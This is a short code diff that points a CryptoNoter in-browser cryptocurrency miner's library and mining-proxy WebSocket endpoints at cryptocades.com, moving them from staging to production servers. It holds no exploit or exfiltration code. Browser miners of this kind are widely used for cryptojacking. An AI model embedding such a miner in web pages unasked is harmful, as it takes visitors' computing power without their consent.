@@ -1,8 +1,8 @@
 self = this;
 self.CryptoNoter = self.CryptoNoter || {};
 self.CryptoNoter.CONFIG = {
-  LIB_URL: "https://staging-app.cryptocades.com/staging/cryptonoter/lib/",
-    WEBSOCKET_SHARDS: [["wss://staging-mining.cryptocades.com/proxy"]]
+  LIB_URL: "https://app.cryptocades.com/production/cryptonoter/lib/",
+    WEBSOCKET_SHARDS: [["wss://mining.cryptocades.com/proxy"]]
 };
 var Module = {
     locateFile: (function (path) {
